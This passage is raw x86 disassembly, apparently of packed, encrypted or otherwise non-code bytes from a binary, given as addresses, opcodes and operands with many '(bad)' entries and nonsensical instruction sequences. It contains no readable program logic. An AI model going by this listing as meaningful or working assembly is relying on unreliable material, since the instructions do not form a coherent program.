  40ee55:	test   eax,0x1b519199
  40ee5a:	ret    0x4475
  40ee5d:	mov    ah,0xe1
  40ee5f:	dec    esp
  40ee60:	mov    ds,WORD PTR [edx]
  40ee62:	mov    ds:0x48d3d528,al
  40ee67:	inc    eax
  40ee68:	inc    eax
  40ee69:	(bad)  
  40ee6a:	mov    ebp,0x3d707998
  40ee6f:	sahf   
  40ee70:	pop    ebp
  40ee71:	adc    eax,0x303a553
  40ee76:	and    BYTE PTR [edx-0x78794e7],cl
  40ee7c:	or     DWORD PTR [edi+0x373d4e24],0xf7dd48e6
  40ee86:	std    
  40ee87:	jle    0x40ee48
  40ee89:	jo     0x40eeb5
  40ee8b:	xor    BYTE PTR [edi-0x2cbfd32e],ch
  40ee91:	jbe    0x40ee16
  40ee93:	add    BYTE PTR [esi+edx*2+0x17],al
  40ee97:	push   edi
  40ee98:	cs cdq 
  40ee9a:	push   esp
  40ee9b:	add    ah,BYTE PTR [esi-0x3]
  40ee9e:	rcl    DWORD PTR [eax+0x506c495],1
  40eea4:	mov    eax,0xb7eb402e
  40eea9:	push   ss
  40eeaa:	mov    ds:0xedb73dee,eax
  40eeaf:	push   esi
  40eeb0:	repnz cmp ecx,edi
  40eeb3:	ins    BYTE PTR es:[edi],dx
  40eeb4:	idiv   DWORD PTR [ebx+0x4579eeeb]
  40eeba:	jmp    0x40eea2
  40eebc:	sbb    DWORD PTR [ebx+0x7a7a6020],eax
  40eec2:	call   0x868d:0x1a45c5c5
  40eec9:	int    0x23
  40eecb:	push   0xddbb7f20
  40eed0:	out    0xc2,al
  40eed2:	test   DWORD PTR [ebx],ecx
  40eed4:	je     0x40ef10
  40eed6:	sbb    eax,0x76602082
  40eedb:	jbe    0x40ef33
  40eedd:	and    eax,0x19b274d1
  40eee2:	lds    esi,FWORD PTR [ecx-0x34]
  40eee5:	cli    
  40eee6:	cli    
  40eee7:	cmp    dl,BYTE PTR [edi+0x6b625d2e]
  40eeed:	imul   ecx,DWORD PTR [ebx],0xffffffcf
  40eef0:	repz fcomp st(2)
  40eef3:	fcmovu st,st(2)
  40eef5:	inc    eax
  40eef6:	xchg   ebp,eax
  40eef7:	pop    ss
  40eef8:	xor    eax,0x9b23cea3
  40eefd:	(bad)
  40ef01:	mov    edi,0xcf6797df
  40ef06:	sahf   
  40ef07:	pop    ebp
  40ef08:	cmp    edi,DWORD PTR [ebx-0xa]
  40ef0b:	in     al,dx
  40ef0c:	pop    ds
  40ef0d:	add    cl,BYTE PTR [ecx+0x10]
  40ef10:	add    al,0xd5
  40ef12:	(bad)
  40ef15:	cdq    
  40ef16:	xchg   DWORD PTR [esi],ebx
  40ef18:	jp     0x40ef02
  40ef1a:	into   
  40ef1b:	cdq    
  40ef1c:	cdq    
  40ef1d:	cdq    
  40ef1e:	mov    ebx,0x87e1e5be
  40ef23:	out    dx,eax
  40ef24:	mov    ebx,0x1f3bcee3
  40ef29:	sbb    BYTE PTR [edi],bl
  40ef2b:	sbb    ebx,DWORD PTR [ebx]
  40ef2d:	sbb    eax,DWORD PTR [esi-0x4e4a405f]
  40ef33:	sar    edx,0xda
  40ef36:	sbb    ch,ch
  40ef38:	push   esi
  40ef39:	dec    ebx
  40ef3a:	sbb    DWORD PTR [edx],ebx
  40ef3c:	jnp    0x40eefb
  40ef3e:	or     al,0xfa
  40ef40:	xor    cl,BYTE PTR [eax]
  40ef42:	out    dx,al
  40ef43:	jbe    0x40ef5d
  40ef45:	dec    ecx
  40ef46:	scas   eax,DWORD PTR es:[edi]
  40ef47:	xlat   BYTE PTR ds:[ebx]
  40ef48:	or     al,0x72
  40ef4a:	adc    DWORD PTR [esi+0x278b9167],ebx
  40ef50:	cmp    al,0x86
  40ef52:	std    
  40ef53:	nop
  40ef54:	stos   DWORD PTR es:[edi],eax
  40ef55:	ret    
  40ef56:	jne    0x40ef06
  40ef58:	scas   al,BYTE PTR es:[edi]
  40ef59:	outs   dx,BYTE PTR ds:[esi]
  40ef5a:	jo     0x40ef3e
  40ef5c:	in     al,0x59
  40ef5e:	sub    dl,BYTE PTR [ebp-0x72a54af6]
  40ef64:	icebp  
  40ef65:	icebp  
  40ef66:	xor    DWORD PTR [esi],edx
  40ef68:	test   dh,0xf3
  40ef6b:	out    dx,al
  40ef6c:	xlat   BYTE PTR ds:[ebx]
  40ef6d:	dec    edi
  40ef6e:	repz fucomp st(7)
  40ef71:	pop    edx
  40ef72:	and    al,0xe6
  40ef74:	xor    bl,bl
  40ef76:	lods   eax,DWORD PTR ds:[esi]
  40ef77:	test   BYTE PTR [ebx+0x6b],cl
  40ef7a:	sub    eax,0xc7a4fcbe
  40ef7f:	jae    0x40efd0
  40ef81:	mov    ebp,0x163f1fc8
  40ef86:	jae    0x40effd
  40ef88:	stc    
  40ef89:	adc    eax,0x447b3636
  40ef8e:	popf   
  40ef8f:	xor    DWORD PTR [eax],ebp
  40ef91:	aad    0x55
  40ef93:	test   al,0x73
  40ef95:	cmc    
  40ef96:	and    BYTE PTR [edi+ecx*1-0x7d],dl
  40ef9a:	out    dx,eax
  40ef9b:	jecxz  0x40ef66
  40ef9d:	xor    ebp,DWORD PTR [eax+0xc8b4]
  40efa3:	and    BYTE PTR [eax],al
  40efa5:	dec    ecx
  40efa6:	inc    esp
  40efa7:	inc    ecx
  40efa8:	push   esp
  40efa9:	push   cs
  40efaa:	and    bl,dl
  40efac:	test   BYTE PTR [eax+0xb],bh
  40efaf:	adc    DWORD PTR [ebp+0x23],ebp
  40efb2:	jecxz  0x40ef6a
  40efb4:	sahf   
  40efb5:	sbb    al,0xa5
  40efb7:	cdq    
  40efb8:	xor    al,0xb4
  40efbb:	(bad)  
  40efbc:	rol    BYTE PTR [ecx+0x53],0x40
  40efc0:	xchg   BYTE PTR [ecx],dh
  40efc2:	or     BYTE PTR [ecx],al
  40efc4:	push   edx
  40efc5:	xor    eax,DWORD PTR [esi-0x500839dc]
  40efcb:	lods   eax,DWORD PTR ds:[esi]
  40efcc:	outs   dx,BYTE PTR ds:[esi]
  40efcd:	cli    
  40efce:	mov    esi,0x25dbb74f
  40efd3:	mov    fs,WORD PTR [ebx-0x75]
  40efd6:	push   es
  40efd7:	aad    0x65
  40efd9:	add    al,0xc0
  40efdb:	in     eax,0x5b
  40efdd:	(bad)  
  40efde:	leave  
  40efdf:	aaa    
  40efe0:	shr    BYTE PTR [esi+0x2a],1
  40efe3:	and    DWORD PTR [eax-0x37750b6f],ecx
  40efe9:	dec    ebp
  40efea:	add    al,BYTE PTR [ebx+edx*4+0x25]
  40efee:	and    eax,0x5a67e51b
  40eff3:	mov    esi,0x2b91400e
  40eff8:	out    dx,eax
  40eff9:	pop    edx
  40effa:	test   BYTE PTR [esp+eax*4+0x1a],bl
  40effe:	jbe    0x40f072
  40f000:	add    DWORD PTR [esi],edx
  40f002:	in     eax,dx
  40f003:	iret   
  40f004:	aas    
  40f005:	dec    edi
  40f006:	adc    DWORD PTR [ecx],edx
  40f008:	sbb    dh,ah
  40f00a:	push   ebx
  40f00b:	scas   eax,DWORD PTR es:[edi]
  40f00c:	xlat   BYTE PTR ds:[ebx]
  40f00d:	cdq    
  40f00e:	cwde   
  40f00f:	cwde   
  40f010:	pusha  
  40f011:	pop    edx
  40f012:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f013:	(bad)  
  40f014:	xor    bh,bl
  40f016:	inc    eax
  40f017:	mov    ecx,0xb6b6b701
  40f01c:	fcomp  st(0)
  40f01e:	fsub   DWORD PTR [eax-0x54ae1429]
  40f024:	aad    0x58
  40f026:	pop    esp
  40f027:	pop    esp
  40f028:	fs jl  0x40f0a7
  40f02b:	fcomp  QWORD PTR [edx]
  40f02d:	jmp    0x40f011
  40f02f:	cmp    BYTE PTR [esi-0x4e4d1225],ah
  40f035:	mov    cl,0xc1
  40f037:	xchg   ebp,eax
  40f038:	sub    edx,DWORD PTR [edi+0x68]
  40f03b:	mov    bh,0xdb
  40f03d:	lods   al,BYTE PTR ds:[esi]
  40f03e:	scas   eax,DWORD PTR es:[edi]
  40f03f:	scas   eax,DWORD PTR es:[edi]
  40f040:	pop    edi
  40f041:	pop    ecx
  40f042:	pop    esi
  40f043:	pop    esi
  40f044:	jle    0x40f030
  40f046:	aam    0xa9
  40f048:	push   ebx
  40f049:	pop    edi
  40f04a:	jle    0x40f03d
  40f04c:	lds    edx,FWORD PTR [edi]
  40f04e:	lahf   
  40f04f:	inc    eax
  40f050:	and    DWORD PTR [eax],eax
  40f052:	sti    
  40f053:	push   0xab485fb9
  40f058:	ins    BYTE PTR es:[edi],dx
  40f059:	add    al,0x40
  40f05b:	sbb    DWORD PTR [eax-0x79e6ebaf],edx
  40f061:	mov    al,0x2
  40f063:	jl     0x40f056
  40f065:	out    0x7f,eax
  40f067:	(bad)  
  40f068:	out    0xab,eax
  40f06a:	rcl    ebx,cl
  40f06c:	rcl    DWORD PTR [ebx-0x1f07c1f1],cl
  40f072:	and    DWORD PTR [ebp+0xfbba5a5],0x687c3e1f
  40f07c:	ins    BYTE PTR es:[edi],dx
  40f07d:	ins    BYTE PTR es:[edi],dx
  40f07e:	ins    BYTE PTR es:[edi],dx
  40f07f:	jbe    0x40f0e2
  40f081:	jle    0x40f101
  40f083:	sub    ch,BYTE PTR [eax]
  40f085:	xchg   ebp,eax
  40f086:	retfw  0x3041
  40f08a:	jecxz  0x40f105
  40f08c:	pop    esi
  40f08d:	xor    BYTE PTR [esi+ecx*1],bl
  40f090:	imul   ebx,DWORD PTR [ecx],0x84a8025b
  40f096:	sub    BYTE PTR [ecx-0x7c],dl
  40f099:	lock cmp al,0x3b
  40f09c:	daa    
  40f09d:	loope  0x40f074
  40f09f:	pusha  
  40f0a0:	or     dh,BYTE PTR [esi-0x64]
  40f0a3:	loopne 0x40f0c5
  40f0a5:	addr16 inc edi
  40f0a7:	pop    eax
  40f0a8:	js     0x40f068
  40f0aa:	dec    edi
  40f0ab:	sbb    al,0x45
  40f0ad:	mov    ah,0xdb
  40f0af:	ins    DWORD PTR es:[edi],dx
  40f0b0:	(bad)  
  40f0b2:	ss xchg edi,eax
  40f0b4:	cs pop ebp
  40f0b6:	(bad)  
  40f0b7:	and    DWORD PTR [ebp+0x6cd9a25],esi
  40f0bd:	mov    bl,0xf3
  40f0bf:	xor    ecx,DWORD PTR [edi+ecx*4+0x6f5df18d]
  40f0c6:	das    
  40f0c7:	repz xchg ecx,eax
  40f0c9:	neg    ebp
  40f0cb:	inc    ebp
  40f0cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0cd:	pop    edi
  40f0ce:	inc    ebx
  40f0cf:	and    al,0x9
  40f0d1:	(bad)  
  40f0d2:	sbb    eax,0x89f6790b
  40f0d7:	stos   DWORD PTR es:[edi],eax
  40f0d8:	pop    esp
  40f0d9:	pop    esi
  40f0da:	pop    ebp
  40f0db:	out    0xdc,eax
  40f0dd:	dec    edx
  40f0de:	enter  0xcaca,0xcb
  40f0e2:	pushf  
  40f0e3:	mov    esi,0xc41c24d4
  40f0e8:	stos   BYTE PTR es:[edi],al
  40f0e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0ea:	inc    ecx
  40f0eb:	mov    edi,0xa879a504
  40f0f0:	in     al,dx
  40f0f1:	push   edi
  40f0f2:	fiadd  WORD PTR [esi-0x27]
  40f0f5:	and    DWORD PTR [edi+ecx*1-0x48eee0b7],0xffffff91
  40f0fd:	jb     0x40f0a7
  40f0ff:	and    bl,BYTE PTR [ebx+eiz*8]
  40f102:	or     cl,BYTE PTR ds:[ecx+ecx*2+0x74e2f654]
  40f10a:	push   ds
  40f10b:	test   BYTE PTR [ecx+0x34844050],cl
  40f111:	push   0xffffffa1
  40f113:	push   ss
  40f114:	mov    ch,al
  40f116:	push   ecx
  40f117:	stos   BYTE PTR es:[edi],al
  40f118:	es inc ch
  40f11b:	ins    DWORD PTR es:[edi],dx
  40f11c:	cli    
  40f11d:	mov    eax,0xa8bdff3e
  40f122:	add    BYTE PTR [esi-0x2271c0db],ch
  40f128:	fidiv  DWORD PTR [ecx-0x52]
  40f12b:	cmc    
  40f12c:	xor    ecx,ecx
  40f12e:	dec    esp
  40f12f:	test   DWORD PTR [ebp+0x7e4ec8e3],0x37fd2570
  40f139:	push   edx
  40f13a:	add    eax,0x799b7af8
  40f13f:	push   ds
  40f140:	iret   
  40f141:	repz cwde 
  40f143:	cwde   
  40f144:	cwde   
  40f145:	pusha  
  40f146:	outs   dx,BYTE PTR ds:[esi]
  40f147:	outs   dx,BYTE PTR ds:[esi]
  40f148:	mov    cs,ecx
  40f14a:	leave  
  40f14b:	dec    ecx
  40f14c:	and    BYTE PTR [eax],0xc8
  40f14f:	and    BYTE PTR [edx-0x2a3a54aa],bl
  40f155:	stos   DWORD PTR es:[edi],eax
  40f156:	push   edi
  40f157:	pop    ecx
  40f158:	pop    ebx
  40f159:	pop    ebx
  40f15a:	inc    ebx
  40f15b:	dec    edx
  40f15c:	leave  
  40f15d:	aam    0xd4
  40f15f:	adc    al,0x8b
  40f161:	mov    ecx,DWORD PTR [ebx-0x732a54ac]
  40f167:	xchg   ecx,eax
  40f168:	jo     0x40f1d7
  40f16a:	ins    DWORD PTR es:[edi],dx
  40f16b:	lea    ecx,[ebx]
  40f16d:	pop    ss
  40f16e:	cs mov al,0xba
  40f171:	mov    edx,0x643870ca
  40f176:	jnp    0x40f1f3
  40f178:	sti    
  40f179:	loop   0x40f12c
  40f17b:	arpl   di,ax
  40f17d:	(bad)  
  40f17e:	loopne 0x40f159
  40f180:	addr16 lahf 
  40f182:	std    
  40f183:	jecxz  0x40f152
  40f185:	int    0xcd
  40f187:	push   ebp
  40f188:	aam    0xb8
  40f18a:	xor    DWORD PTR [ecx],edi
  40f18c:	mov    ch,0x61
  40f18e:	xchg   esp,eax
  40f18f:	clc    
  40f190:	mov    ebx,DWORD PTR [eax+0x7dd67481]
  40f196:	jge    0x40f216
  40f198:	cmp    eax,0x75649249
  40f19d:	jne    0x40f154
  40f19f:	cmc    
  40f1a0:	fxch   st(7)
  40f1a2:	jle    0x40f19a
  40f1a4:	pop    ecx
  40f1a5:	loopne 0x40f1f0
  40f1a7:	jge    0x40f176
  40f1a9:	jb     0x40f150
  40f1ab:	push   edx
  40f1ac:	or     DWORD PTR [edx],ebp
  40f1ae:	xchg   ebp,eax
  40f1af:	dec    edx
  40f1b0:	stc    
  40f1b1:	cmc    
  40f1b2:	scas   eax,DWORD PTR es:[edi]
  40f1b3:	jg     0x40f1b2
  40f1b5:	rcr    BYTE PTR [ebp-0x7862189],cl
  40f1bb:	rol    BYTE PTR [ecx-0x64288fd],0xcd
  40f1c2:	outs   dx,DWORD PTR ds:[esi]
  40f1c3:	jle    0x40f235
  40f1c5:	iret   
  40f1c6:	sahf   
  40f1c7:	cmp    eax,0x468d1afb
  40f1cc:	mov    ch,0xb5
  40f1ce:	mov    ch,0xc5
  40f1d0:	aad    0xab
  40f1d2:	push   edi
  40f1d3:	(bad)  
  40f1d5:	fsub   DWORD PTR [eax+0x7b]
  40f1d8:	jnp    0x40f235
  40f1da:	int    0x85
  40f1dc:	shl    BYTE PTR [ecx],1
  40f1de:	stos   BYTE PTR es:[edi],al
  40f1df:	stc    
  40f1e0:	call   0xbdce:0x3e90df8a
  40f1e7:	ins    BYTE PTR es:[edi],dx
  40f1e8:	out    0xca,al
  40f1ea:	scas   al,BYTE PTR es:[edi]
  40f1eb:	add    al,cl
  40f1ed:	popf   
  40f1ee:	adc    DWORD PTR [edx+ebp*1-0x62d7ae56],0xffffffdb
  40f1f6:	and    BYTE PTR [ebx-0x4e4de3d0],ch
  40f1fc:	ds pusha 
  40f1fe:	ins    DWORD PTR es:[edi],dx
  40f1ff:	jge    0x40f25e
  40f201:	cmp    eax,0x95b236b3
  40f206:	retf   0x413e
  40f209:	push   eax
  40f20a:	bound  esi,QWORD PTR [ecx-0x46]
  40f20d:	leave  
  40f20e:	inc    ebx
  40f20f:	pop    ds
  40f210:	cdq    
  40f211:	daa    
  40f212:	test   al,0x1c
  40f214:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f215:	push   esp
  40f216:	outs   dx,BYTE PTR ds:[esi]
  40f217:	push   edx
  40f218:	cs xchg ebp,eax
  40f21a:	mov    DWORD PTR [ebp-0x40],esp
  40f21d:	pusha  
  40f21e:	xor    al,ah
  40f220:	jae    0x40f281
  40f222:	mov    edi,DWORD PTR [ecx-0x12]
  40f225:	icebp  
  40f226:	xchg   ebx,eax
  40f227:	cmp    al,0x72
  40f229:	adc    al,0x5e
  40f22b:	jns    0x40f20e
  40f22d:	sub    bl,BYTE PTR [ebx-0x62db5415]
  40f233:	xor    eax,esi
  40f235:	retf   
  40f236:	rcr    al,1
  40f238:	add    esi,ebp
  40f23a:	ret    
  40f23b:	mov    BYTE PTR [eax+0x2a4af082],ah
  40f241:	mov    esp,0xd10ab879
  40f246:	push   ss
  40f247:	inc    esp
  40f248:	sbb    ecx,eax
  40f24a:	jo     0x40f25f
  40f24c:	push   eax
  40f24d:	icebp  
  40f24e:	or     ah,BYTE PTR [eax+0x1b56e012]
  40f254:	xchg   edx,eax
  40f255:	sti    
  40f256:	out    dx,al
  40f257:	imul   esi,DWORD PTR [eax],0xe4818a74
  40f25d:	mov    ebp,0x5befbe56
  40f262:	xor    al,0x6
  40f264:	sbb    ecx,esp
  40f266:	shl    esi,cl
  40f268:	push   ebp
  40f269:	retf   0x6003
  40f26c:	fisubr DWORD PTR [esi+0x25aa00bd]
  40f272:	call   0xb097:0x145555d8
  40f279:	pop    ebp
  40f27a:	add    cl,BYTE PTR [edi-0x6e]
  40f27d:	cwde   
  40f27e:	cmp    dh,cl
  40f280:	xor    al,BYTE PTR [eax]
  40f282:	xlat   BYTE PTR ds:[ebx]
  40f283:	push   es
  40f284:	lock cmc 
  40f286:	stos   BYTE PTR es:[edi],al
  40f287:	add    BYTE PTR [edi],dh
  40f289:	loop   0x40f2c0
  40f28b:	sub    BYTE PTR [edx-0x9912662],bh
  40f291:	aad    0x6a
  40f293:	xor    eax,0x9fdfeff6
  40f298:	sub    edi,0xd7af5f66
  40f29e:	jecxz  0x40f29c
  40f2a0:	stc    
  40f2a1:	rep lods al,BYTE PTR ds:[esi]
  40f2a3:	scas   al,BYTE PTR es:[edi]
  40f2a4:	scas   al,BYTE PTR es:[edi]
  40f2a5:	xchg   edx,eax
  40f2a6:	and    al,0x9
  40f2a8:	rcl    ebx,cl
  40f2aa:	shr    DWORD PTR [ebp*1+0x56ad512d],cl
  40f2b1:	xor    esi,edi
  40f2b3:	outs   dx,BYTE PTR ds:[esi]
  40f2b4:	mov    ch,0x5a
  40f2b6:	pushf  
  40f2b7:	cmp    eax,0xe5e5967b
  40f2bc:	gs loop 0x40f2f7
  40f2bf:	es or  al,0xc3
  40f2c2:	rcl    DWORD PTR [ebx+0x4f],0x3d
  40f2c6:	cmc    
  40f2c7:	imul   ecx,edi,0x3d
  40f2ca:	neg    esp
  40f2cc:	pop    ds
  40f2cd:	ins    DWORD PTR es:[edi],dx
  40f2ce:	ins    BYTE PTR es:[edi],dx
  40f2cf:	ins    BYTE PTR es:[edi],dx
  40f2d0:	lods   al,BYTE PTR ds:[esi]
  40f2d1:	mov    eax,ds:0xa129b8a4
  40f2d6:	jmp    0x40f2ea
  40f2d8:	mov    ecx,0xdbafceb8
  40f2dd:	not    edx
  40f2df:	stc    
  40f2e0:	push   ebx
  40f2e1:	dec    edx
  40f2e2:	lods   al,BYTE PTR ds:[esi]
  40f2e3:	bound  ecx,QWORD PTR [eax]
  40f2e5:	gs mov ebp,0xc18012d
  40f2eb:	push   es
  40f2ec:	leave  
  40f2ed:	pusha  
  40f2ee:	xor    al,ch
  40f2f0:	cmp    eax,0xc723c8f2
  40f2f5:	push   ds
  40f2f6:	jns    0x40f2dc
  40f2f8:	xchg   ecx,eax
  40f2f9:	add    DWORD PTR [bx+di-0x51],edx
  40f2fd:	xlat   BYTE PTR ds:[ebx]
  40f2fe:	(bad)  
  40f2ff:	out    dx,al
  40f300:	cmp    al,0x7c
  40f302:	js     0x40f2fa
  40f304:	fwait
  40f305:	out    dx,eax
  40f306:	mov    edi,0x47239eff
  40f30b:	mov    ds,esp
  40f30d:	sti    
  40f30e:	lock ret 
  40f310:	(bad)  
  40f312:	jo     0x40f378
  40f314:	popa   
  40f315:	loope  0x40f2f7
  40f317:	clc    
  40f318:	clc    
  40f319:	js     0x40f2d8
  40f31b:	shr    DWORD PTR [esi-0x4d],cl
  40f31e:	jp     0x40f315
  40f320:	sub    bl,BYTE PTR [ebp-0x4a0a78b2]
  40f326:	xor    eax,0x4daedd7a
  40f32b:	pop    edi
  40f32c:	in     eax,dx
  40f32d:	(bad)  
  40f32e:	push   esp
  40f32f:	xor    al,0x7d
  40f331:	mov    bh,0xdb
  40f333:	xchg   esi,eax
  40f334:	daa    
  40f335:	js     0x40f2bb
  40f337:	jno    0x40f30c
  40f339:	adc    eax,0x526a2bec
  40f33e:	fisubr DWORD PTR [ecx+0x7b8516a5]
  40f344:	sahf   
  40f345:	rcr    BYTE PTR [edi-0x6a5b667c],cl
  40f34b:	nop
  40f34c:	hlt    
  40f34d:	adc    eax,DWORD PTR [esi]
  40f34f:	test   BYTE PTR [ebx+ebx*8+0x5797965d],dh
  40f356:	push   esp
  40f357:	lods   al,BYTE PTR ds:[esi]
  40f358:	inc    edx
  40f359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f35a:	inc    esp
  40f35b:	mov    ds:0x4a7a60d1,eax
  40f360:	fldenv [ebp+0x3e]
  40f363:	lock xchg esi,eax
  40f365:	dec    ecx
  40f366:	ds (bad) 
  40f368:	pop    ss
  40f369:	mov    esi,0x625c7e99
  40f36e:	rcl    BYTE PTR [ebx-0x6f1a1284],1
  40f374:	scas   eax,DWORD PTR es:[edi]
  40f375:	dec    cl
  40f377:	sbb    ch,BYTE PTR [ebx]
  40f379:	sub    esp,DWORD PTR [edi-0x49503c08]
  40f37f:	mov    eax,0xed18f27a
  40f384:	mov    ch,0x6
  40f386:	jb     0x40f330
  40f388:	sbb    edx,eax
  40f38a:	fdivr  DWORD PTR [esp+edx*8]
  40f38d:	punpcklwd mm6,DWORD PTR [edx]
  40f390:	and    DWORD PTR [ebx-0x2f],edi
  40f393:	cmp    al,BYTE PTR [ebx+ebx*4+0x10]
  40f397:	scas   al,BYTE PTR es:[edi]
  40f398:	shl    BYTE PTR [eax-0x7d],0x5a
  40f39c:	lods   eax,DWORD PTR ds:[esi]
  40f39d:	ret    
  40f39e:	loop   0x40f362
  40f3a0:	sbb    bl,al
  40f3a2:	mov    al,0xef
  40f3a4:	cmp    al,0xee
  40f3a6:	sub    dl,dh
  40f3a8:	ins    BYTE PTR es:[edi],dx
  40f3a9:	mov    bh,0xdb
  40f3ab:	inc    ebp
  40f3ac:	mov    WORD PTR [ebp+0x1b],?
  40f3af:	aaa    
  40f3b0:	icebp  
  40f3b1:	loopne 0x40f35e
  40f3b3:	shl    BYTE PTR [esi+0x65],1
  40f3b6:	add    al,0x4
  40f3b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3b9:	test   DWORD PTR [edi],0x8d1a0306
  40f3bf:	xchg   BYTE PTR [esi-0x1ffba603],al
  40f3c5:	sbb    bh,dh
  40f3c7:	fsub   st(7),st
  40f3c9:	imul   ebp,DWORD PTR [edx],0xf54516a1
  40f3cf:	in     eax,0xdb
  40f3d1:	lea    ebp,[edx+0x4c7a3700]
  40f3d7:	fidiv  WORD PTR [eax]
  40f3d9:	push   0xd9b37e24
  40f3de:	mov    ah,0x7a
  40f3e0:	mov    ebx,0xfecccdd1
  40f3e5:	dec    esi
  40f3e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3e7:	ret    
  40f3e8:	retf   0x8aca
  40f3eb:	and    eax,0x49c9c9fc
  40f3f0:	push   ss
  40f3f1:	push   ss
  40f3f2:	push   ss
  40f3f3:	sbb    BYTE PTR [ebx],bl
  40f3f5:	sbb    ecx,ebx
  40f3f7:	and    al,0x79
  40f3f9:	fcomp  st(6)
  40f3fb:	fsubrp st(6),st
  40f3fd:	fdivr  QWORD PTR [ecx+0x7cbe5c73]
  40f403:	cdq    
  40f404:	dec    esi
  40f405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f406:	ret    
  40f407:	div    dh
  40f409:	div    dh
  40f40b:	repnz repnz repnz push edi
  40f40f:	mov    ds,WORD PTR [edi]
  40f411:	aas    
  40f412:	(bad)  
  40f413:	fnstenv [ebx]
  40f415:	addr16 into 
  40f417:	mov    esp,0xa6d02284
  40f41c:	mov    ecx,0x9042053d
  40f421:	sub    al,0xd1
  40f423:	jecxz  0x40f441
  40f425:	fwait
  40f426:	dec    ebp
  40f428:	xor    eax,DWORD PTR [edx+0x36a37efc]
  40f42e:	call   0x28455acd
  40f433:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f434:	and    edi,DWORD PTR [ebx-0xb8b9123]
  40f43a:	stc    
  40f43b:	out    0x2f,eax
  40f43d:	sbb    al,0x7d
  40f43f:	(bad)  
  40f440:	stc    
  40f441:	push   ebx
  40f442:	shl    BYTE PTR [edi+0x6a],0xb5
  40f446:	pop    edx
  40f447:	jae    0x40f4b7
  40f449:	outs   dx,BYTE PTR ds:[esi]
  40f44a:	outs   dx,BYTE PTR ds:[esi]
  40f44b:	cli    
  40f44c:	mov    eax,ds:0x783a1e87
  40f451:	(bad)  
  40f452:	std    
  40f453:	idiv   DWORD PTR [edi]
  40f455:	hlt    
  40f456:	out    0xdf,eax
  40f458:	hlt    
  40f459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f45a:	xlat   BYTE PTR ds:[ebx]
  40f45b:	in     al,dx
  40f45c:	fnsave [edi+0x7743ceef]
  40f462:	fcom   QWORD PTR [ecx-0x69]
  40f465:	push   eax
  40f466:	sbb    DWORD PTR [ebx+edi*4-0xc],esi
  40f46a:	pop    es
  40f46b:	add    esp,DWORD PTR [ebp-0x45]
  40f46e:	fcomp  st(0)
  40f470:	mov    al,0xf6
  40f472:	getsec 
  40f474:	aam    0x39
  40f476:	lods   eax,DWORD PTR ds:[esi]
  40f477:	(bad)  
  40f479:	add    ecx,DWORD PTR [ecx+eax*2+0xf9d231b]
  40f480:	mov    eax,ds:0x10da74dd
  40f485:	and    ah,BYTE PTR ds:0x9a8a44d2
  40f48b:	ins    DWORD PTR es:[edi],dx
  40f48c:	out    0x1c,al
  40f48e:	int    0x30
  40f490:	pop    esp
  40f491:	adc    DWORD PTR [ecx+0x178db6bf],0x410bf774
  40f49b:	adc    al,0x25
  40f49d:	ins    BYTE PTR es:[edi],dx
  40f49e:	ins    DWORD PTR es:[edi],dx
  40f49f:	outs   dx,BYTE PTR ds:[esi]
  40f4a0:	mov    bl,0xb9
  40f4a2:	mov    cl,0x5
  40f4a4:	inc    edx
  40f4a5:	jo     0x40f4e3
  40f4a7:	or     BYTE PTR [eax-0x7073346c],ch
  40f4ad:	xor    eax,0xf38c4e68
  40f4b2:	out    0x96,eax
  40f4b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4b5:	jns    0x40f4ae
  40f4b7:	fistp  WORD PTR [ecx+0x76c2de04]
  40f4bd:	dec    edi
  40f4be:	mov    al,0xba
  40f4c0:	fsubrp st(5),st
  40f4c2:	idiv   DWORD PTR [edi-0x198a4e16]
  40f4c8:	sub    al,0xbf
  40f4ca:	call   FWORD PTR [eax-0x75]
  40f4cd:	push   edi
  40f4ce:	sahf   
  40f4cf:	cmp    DWORD PTR [edx-0x41],ecx
  40f4d2:	mov    ebx,0x46993f45
  40f4d7:	xor    esp,DWORD PTR es:[ecx+esi*8]
  40f4db:	adc    al,0x88
  40f4dd:	inc    ebp
  40f4de:	test   al,0x1f
  40f4e0:	test   BYTE PTR [edx+0x9],ch
  40f4e3:	outs   dx,DWORD PTR ds:[esi]
  40f4e4:	cld    
  40f4e5:	adc    eax,0xbf490d9a
  40f4ea:	xlat   BYTE PTR ds:[ebx]
  40f4eb:	inc    ecx
  40f4ec:	gs xor dl,cl
  40f4ef:	stos   BYTE PTR es:[edi],al
  40f4f0:	add    BYTE PTR [esi],ah
  40f4f2:	xchg   esi,eax
  40f4f3:	arpl   WORD PTR [eax],di
  40f4f5:	sub    al,0x9c
  40f4f7:	sub    eax,ebx
  40f4f9:	push   es
  40f4fa:	pop    esi
  40f4fb:	xchg   ebp,eax
  40f4fc:	imul   eax,eax,0xdd2eda6
  40f502:	test   al,0x2a
  40f504:	mov    al,ds:0xa41d7af4
  40f509:	pushf  
  40f50a:	rcl    BYTE PTR [edx+0x34],cl
  40f50d:	(bad)  
  40f50e:	mov    eax,0x401b5d03
  40f513:	push   0xfffffff4
  40f515:	shl    DWORD PTR [edi],cl
  40f517:	or     al,BYTE PTR [edx-0x5d5646b4]
  40f51d:	jbe    0x40f55c
  40f51f:	arpl   di,bx
  40f521:	mov    ch,0x8e
  40f523:	das    
  40f524:	xor    dh,ah
  40f526:	adc    eax,0xb56ab1c1
  40f52b:	retf   0xe4e4
  40f52e:	and    al,0xe3
  40f530:	jecxz  0x40f515
  40f532:	mov    WORD PTR [ebp+0xfa8598d],cs
  40f538:	shr    bh,1
  40f53a:	neg    ecx
  40f53c:	fcomp  st(0)
  40f53e:	pusha  
  40f53f:	arpl   WORD PTR [ebx-0x7d],sp
  40f542:	push   esi
  40f543:	stos   DWORD PTR es:[edi],eax
  40f544:	inc    ebp
  40f545:	mov    ch,0x5a
  40f547:	imul   ebp,DWORD PTR gs:[ecx-0x77],0xea49c9c9
  40f54f:	cmc    
